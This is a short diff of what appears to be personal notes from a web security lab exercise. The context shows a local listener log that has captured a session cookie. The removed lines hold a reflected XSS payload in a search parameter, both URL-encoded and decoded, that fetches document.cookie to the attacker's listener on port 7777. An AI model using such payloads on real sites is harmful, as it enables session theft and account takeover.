@@ -47,11 +47,3 @@ Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
 127.0.0.1 - - [27/Sep/2025 14:46:31] "GET /?c=SessionId=YWRtaW5AaGV4ZHVtcC5zaA%3
 2d28a1d7807fc7a2dd603d23a8743812c4542ed5d1c0b7ee143f1f33277e69f9%26100 HTTP/1.1"
 #+end_src
-
-
-* vulnerability found after login
-
-http://localhost:1337/PortalSearch?SearchString=%3c%73%63%72%69%70%74%3e%66%65%74%63%68%28%27%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%37%37%37%37%2f%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e
-
-
-<script>fetch('http://localhost:7777/?c='+document.cookie)</script>
